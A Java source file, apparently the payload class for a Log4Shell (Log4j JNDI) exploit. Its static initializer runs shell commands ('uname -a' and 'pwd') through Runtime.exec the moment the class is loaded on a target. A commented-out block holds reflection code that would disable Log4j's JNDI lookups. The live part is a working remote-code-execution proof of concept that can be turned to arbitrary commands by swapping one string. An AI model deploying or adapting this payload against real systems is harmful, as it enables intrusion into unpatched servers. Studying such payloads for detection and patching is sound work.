import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.LoggerContext;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.Configurator;
import org.apache.logging.log4j.core.lookup.Interpolator;
import org.apache.logging.log4j.core.lookup.StrLookup;
import org.apache.logging.log4j.core.selector.ContextSelector;

import java.lang.reflect.Field;
import java.lang.reflect.Constructor;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.HashMap;
import java.util.Map;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;


public class Log4jRCE {
    static {
        try {
	    try { // Try for versions of Log4j >= 2.10
              Runtime runtime = Runtime.getRuntime();
              String computerInfo = getCmdResultString(runtime.exec("uname -a"));
              System.out.println(computerInfo);
              String pathInfo = getCmdResultString(runtime.exec("pwd"));
              System.out.println(pathInfo);
	    } catch (IOException e) {
	       e.printStackTrace();
	    }
	/*
            try { // Try for versions of Log4j >= 2.10
              Class<?> c = Thread.currentThread().getContextClassLoader().loadClass("org.apache.logging.log4j.core.util.Constants");
              Field field = c.getField("FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS");
              System.out.println("Setting " + field.getName() + " value to True");
              setFinalStatic(field, Boolean.TRUE);
            } catch (NoSuchFieldException e) { // Fall back to older versions. Try to make JNDI non instantiable
               System.err.println("No field FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS - version <= 2.9.0");
               System.err.println("Will attempt to modify the configuration directly");
            }

            //reconfiguring log4j
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            Class<?> configuratorClass = classLoader.loadClass("org.apache.logging.log4j.core.config.Configurator");
            try {
                Method reconfigure = configuratorClass.getMethod("reconfigure");
                reconfigure.invoke(null);
            } catch (Exception ex) {
                Method getFactoryMethod = configuratorClass.getDeclaredMethod("getFactory");
                getFactoryMethod.setAccessible(true);
                Object factory = getFactoryMethod.invoke(null);
                Class<?> log4jContextFactoryClass = classLoader.loadClass("org.apache.logging.log4j.core.impl.Log4jContextFactory");
                Method getSelector = log4jContextFactoryClass.getMethod("getSelector");
                Object contextSelector = getSelector.invoke(factory, null);
                ContextSelector ctxSelector = (ContextSelector) contextSelector;
                for (LoggerContext ctx: ctxSelector.getLoggerContexts()) {
                    ctx.reconfigure();
                    System.err.println("Reconfiguring context");
                    Configuration config = ctx.getConfiguration();
                    StrLookup resolver = config.getStrSubstitutor().getVariableResolver();
                    if (resolver instanceof Interpolator) {
                        System.err.println("Lookup is an Interpolator - attempting to remove JNDI");
                        Field lookups = null;
                        try {
                            lookups = Interpolator.class.getDeclaredField("lookups");
                        } catch (NoSuchFieldException e) {
                            lookups = Interpolator.class.getDeclaredField("strLookupMap");
                        }
                        lookups.setAccessible(true);
                        Map<String, StrLookup> lookupMap = (Map<String, StrLookup>) lookups.get(resolver);
                        lookupMap.remove("jndi");
                    }
                }
            }
	*/
        } catch (Exception e) {
            System.err.println("Exception " + e);
            e.printStackTrace();
        }
    }

    static void setFinalStatic(Field field, Object newValue) throws Exception {
        setAccess(field);
        field.set(null, newValue);
    }

    private static void setAccess(Field field) throws NoSuchFieldException, IllegalAccessException {
        field.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
    }

    private static String getCmdResultString(Process p) {
    	StringBuffer result = new StringBuffer();
    	InputStream is = p.getInputStream();
    	BufferedReader reader = new BufferedReader(new InputStreamReader(is));
    	String line;
    	try {
    		while ((line = reader.readLine()) != null) {
    			result.append(line + "\n");
    		}
    		p.waitFor();
    		is.close();
    		reader.close();
    	} catch (IOException e) {
    		e.printStackTrace();
    	} catch (InterruptedException e) {
    		e.printStackTrace();
    	}
    
    	return result.toString();
    }
}
